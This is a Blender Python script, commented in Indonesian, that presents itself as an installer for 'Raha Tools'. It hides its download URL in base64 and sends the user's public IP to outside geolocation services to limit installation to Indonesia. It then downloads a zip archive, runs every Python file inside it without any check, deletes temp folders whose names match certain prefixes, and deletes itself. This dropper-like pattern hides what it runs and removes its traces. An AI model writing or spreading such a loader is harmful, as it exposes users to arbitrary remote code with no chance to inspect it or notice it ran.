import bpy
import os
import shutil
import zipfile
import requests
import stat
import getpass
import base64
from io import BytesIO

# === KONFIGURASI (URL DISAMARKAN DENGAN BASE64) ===
ENCODED_URL = "aHR0cHM6Ly9naXRodWIuY29tL3Jyc3R1ZGlvZGV2ZWxvcG1lbnQvUlItVC1CLjRfVjA4L2FyY2hpdmUvcmVmcy9oZWFkcy9tYWluLnppcA=="
ZIP_URL = base64.b64decode(ENCODED_URL).decode("utf-8")

TEMP_FOLDER = bpy.app.tempdir
EXTRACT_TO = os.path.join(TEMP_FOLDER, "raha_tools_install")

# -------------------------------------------------------------------
# Utilitas UI
# -------------------------------------------------------------------
def show_message_box(message, title="Info", icon='INFO'):
    """Menampilkan popup di Blender"""
    def draw(self, context):
        self.layout.label(text=message)
    bpy.context.window_manager.popup_menu(draw, title=title, icon=icon)

# -------------------------------------------------------------------
# Cek lokasi lewat IP publik
# -------------------------------------------------------------------
def is_user_in_indonesia():
    try:
        # 1. Ambil IP publik
        ip_resp = requests.get("https://api.ipify.org?format=json", timeout=5)
        ip_data = ip_resp.json()
        public_ip = ip_data.get("ip", "")
        print(f"[INFO] IP publik terdeteksi: {public_ip}")

        if not public_ip:
            print("[ERROR] Tidak bisa mendapatkan IP publik.")
            return False

        # 2. Lacak negara dari IP
        geo_resp = requests.get(f"http://ip-api.com/json/{public_ip}?fields=country", timeout=5)
        geo_data = geo_resp.json()
        country = geo_data.get("country", "")
        print(f"[INFO] Negara terdeteksi: {country}")

        return country.strip().lower() == "indonesia"

    except Exception as e:
        print(f"[ERROR] Gagal cek lokasi via IP: {e}")
        return False

# -------------------------------------------------------------------
# Bersihkan folder RR-T* atau blender_a* lama di Temp
# -------------------------------------------------------------------
def _remove_readonly(func, path, _):
    os.chmod(path, stat.S_IWRITE)
    func(path)

def delete_rr_t_folders():
    """Hapus folder dengan awalan 'RR-T' atau 'blender_a' di Temp Windows & Temp Blender."""
    
    def _delete_in_path(base_path):
        if not os.path.exists(base_path):
            return
        for name in os.listdir(base_path):
            full_path = os.path.join(base_path, name)
            if os.path.isdir(full_path) and (name.startswith("RR-T") or name.startswith("blender_a")):
                try:
                    shutil.rmtree(full_path, onerror=_remove_readonly)
                    print(f"[INFO] Folder dihapus: {full_path}")
                except Exception as e:
                    print(f"[WARNING] Gagal hapus {full_path}: {e}")

    # Hapus di Temp Windows
    username = getpass.getuser()
    win_temp = os.path.join("C:\\Users", username, "AppData", "Local", "Temp")
    _delete_in_path(win_temp)

    # Hapus di Temp Blender
    blender_temp = bpy.app.tempdir
    _delete_in_path(blender_temp)

# -------------------------------------------------------------------
# Download & extract zip
# -------------------------------------------------------------------
def download_and_extract_zip():
    try:
        if os.path.exists(EXTRACT_TO):
            shutil.rmtree(EXTRACT_TO, onerror=_remove_readonly)
        os.makedirs(EXTRACT_TO, exist_ok=True)

        print(f"[INFO] Download dari: {ZIP_URL}")
        response = requests.get(ZIP_URL, headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
        if response.status_code != 200:
            print(f"[ERROR] Gagal download ZIP: {response.status_code}")
            return None

        with zipfile.ZipFile(BytesIO(response.content)) as zip_ref:
            zip_ref.extractall(EXTRACT_TO)
        print(f"[INFO] Berhasil diekstrak ke: {EXTRACT_TO}")

        for name in os.listdir(EXTRACT_TO):
            path = os.path.join(EXTRACT_TO, name)
            if os.path.isdir(path) and name.endswith("-main"):
                print(f"[INFO] Folder utama ditemukan: {path}")
                return path

        print("[ERROR] Folder '-main' tidak ditemukan.")
        return None
    except Exception as e:
        print(f"[ERROR] Exception saat download/extract: {e}")
        return None

# -------------------------------------------------------------------
# Eksekusi semua .py
# -------------------------------------------------------------------
def execute_all_py_scripts(folder):
    count = 0
    for root, _, files in os.walk(folder):
        for file in files:
            if file.endswith(".py"):
                path = os.path.join(root, file)
                try:
                    print(f"[INFO] Jalankan script: {path}")
                    bpy.ops.script.python_file_run(filepath=path)
                    count += 1
                except Exception as e:
                    print(f"[ERROR] Gagal menjalankan {file}: {e}")
    if count == 0:
        print("[WARNING] Tidak ada script .py yang dijalankan.")
    else:
        print(f"[INFO] Total script dijalankan: {count}")

# -------------------------------------------------------------------
# Self-delete
# -------------------------------------------------------------------
def self_delete():
    try:
        script_path = os.path.abspath(__file__)
    except NameError:
        script_path = None
    if script_path and os.path.exists(script_path):
        try:
            os.remove(script_path)
            print(f"[INFO] Skrip instalasi dihapus: {script_path}")
        except Exception as e:
            print(f"[WARNING] Gagal hapus skrip: {e}")

# -------------------------------------------------------------------
# Jalankan utama
# -------------------------------------------------------------------
def install_raha_tools():
    # 1. Download & ekstrak
    folder = download_and_extract_zip()
    if not folder:
        print("[ERROR] Proses download & ekstrak gagal total.")
        show_message_box("Instalasi gagal. Coba lagi nanti.", "Gagal", 'ERROR')
        return

    # 2. Jalankan semua script
    execute_all_py_scripts(folder)

    # 3. Hapus folder temp (RR-T* dan blender_a*)
    delete_rr_t_folders()

    # 4. Pesan sukses
    print("[INFO] Raha Tools selesai di-instal.")
    show_message_box("Raha Tools berhasil diinstal!", "Install Selesai", 'INFO')

    # 5. Self delete
    self_delete()

# -------------------------------------------------------------------
# Entry point
# -------------------------------------------------------------------
def main():
    if not is_user_in_indonesia():
        show_message_box("Sorry, this version is only for users in Indonesia.", "Akses Ditolak", 'ERROR')
        print("[ERROR] Pengguna tidak berada di Indonesia. Instalasi dibatalkan.")
        return

    major, minor = bpy.app.version[:2]
    if major == 4:
        install_raha_tools()
    else:
        show_message_box(f"Blender {major}.{minor} tidak didukung. Gunakan Blender 4.x.", "Versi Tidak Didukung", 'ERROR')

main()
